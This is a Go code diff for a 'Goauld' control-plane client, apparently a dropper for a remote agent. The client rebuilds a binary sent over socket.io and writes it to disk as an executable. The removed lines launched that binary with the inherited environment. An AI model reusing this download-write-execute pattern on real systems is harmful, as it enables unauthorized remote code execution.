@@ -9,9 +9,7 @@ import (
 	"Goauld/common/log"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
-	"time"
 
 	socketio "Goauld/common/socket.io"
 	sio "github.com/hazegard/socket.io-go"
@@ -52,13 +50,16 @@ func (cpc *ControlPlanClient) Start() error {
 			if cr.AddChunk(binary) {
 				d := cr.Rebuild()
 				fmt.Println(len(d))
-				fmt.Println(DropAndExec(d))
-				time.Sleep(1 * time.Second)
-				cpc.canceler.Exit("Dropped")
+				goauld, err := drop(d)
+				if err != nil {
+					log.Error().Err(err).Msg("Error dropping goauld agent")
+					cpc.canceler.Exit("Error dropping goauld agent")
+					return
+				}
+				cpc.configDone <- goauld
 			}
 		}
 	})
-	fmt.Println("f")
 
 	// This will be emitted after the socket is connected.
 	cpc.socket.Emit(socketio.RegisterEvent.ID(), socketio.Register{
@@ -83,7 +84,7 @@ func (cpc *ControlPlanClient) Start() error {
 
 	return nil
 }
-func DropAndExec(binary []byte) error {
+func drop(binary []byte) (string, error) {
 	wd, err := os.Getwd()
 	if err != nil {
 		wd = os.TempDir()
@@ -91,17 +92,8 @@ func DropAndExec(binary []byte) error {
 	target := filepath.Join(wd, "goauld")
 	err = os.WriteFile(target, binary, 0o755)
 	if err != nil {
-		return err
+		return "", err
 	}
 
-	cmd := exec.Command(target)
-
-	env := os.Environ()
-	env = append(env, config.Get().Env()...)
-	cmd.Env = env
-	err = cmd.Start()
-	if err != nil {
-		return err
-	}
-	return nil
+	return target, nil
 }
